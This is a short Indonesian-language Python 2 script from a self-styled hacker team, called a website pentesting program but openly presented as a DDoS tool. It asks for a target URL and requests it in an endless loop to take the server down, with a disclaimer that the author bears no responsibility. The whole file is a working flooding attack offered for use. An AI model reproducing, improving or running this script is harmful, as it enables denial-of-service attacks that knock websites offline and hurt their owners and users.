print ("****** 26 Mei 2018 Pacman Dark Hackers Cybersecurity Indonesian Team™ ********")
print ("****** Program Pentesting Website ******")
print ("****** Chief Executive Officer Founder Mr._Unknown_ ******")
print ("****** Instagram : @pcmdh ******")
print (" Gunakanlah Seperlunya, Jangan Menggunakan Terlalu Sering, Karena Pembuat Script Ini Tidak Bertanggung Jawab")

import mechanize,time
 
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
 
print ("##########################################")
time.sleep(1)
print ("\n Serangan DDoS menggunakan bahasa pemrogaman phyton\n Versi: 1.0")
print ("Website target yang sudah down servernya: \n HTTP Error 503: Service Not Available \n")
print ("Maaf sambungan ke target tidak berhasil:\n Connectiom refused.\n Alasan: alamat/port salah \n")
print ("Maaf sambungan ke target tidak berhasil:\n temporary failure in name resolution.\n Alasan: url salah/nama domain atau alamat ip tidak ada/Maaf sambungan ke target tidak tersedia \n")
time.sleep(0.69)
print ("##########################################")
time.sleep(0.69)
print ("\n")
def luncurkan():
 print ("\n Mohon Bersabar.Program Sedang Berjalan \n Server akan down beberapa saat lagi. \n")
 while True:
  r =br.open("http://"+target)
 
def input_target():
 global target
 target=raw_input("url target:\nhttp://")
 luncurkan()
 
input_target()
